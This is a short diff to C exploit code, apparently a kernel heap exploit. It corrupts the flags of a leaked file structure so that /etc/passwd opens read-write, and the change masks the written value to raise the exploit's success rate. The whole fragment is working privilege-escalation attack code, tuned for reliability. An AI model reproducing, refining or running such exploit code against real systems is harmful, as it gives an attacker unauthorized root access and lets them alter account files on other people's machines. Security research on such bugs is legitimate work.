@@ -11,6 +11,7 @@
 #define VAL_PATH    0x0008400000000000
 #define VAL_RDONLY  0x000a800d00000000
 #define VAL_RDWR    0x000f800f00000000
+#define VAL_MASK    0x000f000f00000000
 
 char clear[FILE_SIZE] = {0};
 
@@ -43,7 +44,9 @@ int main(int argc, char* argv[]) {
 #endif
 
   puts("[+] corrupt /etc/passwd to make O_RDWR"); 
-  leak[2] = VAL_RDWR;
+  // is guessable, but this increases successrate
+  leak[2] &= ~VAL_MASK;
+  leak[2] |= VAL_RDWR & VAL_MASK;
 
   keap_write(ptr, leak, FILE_SIZE);
 
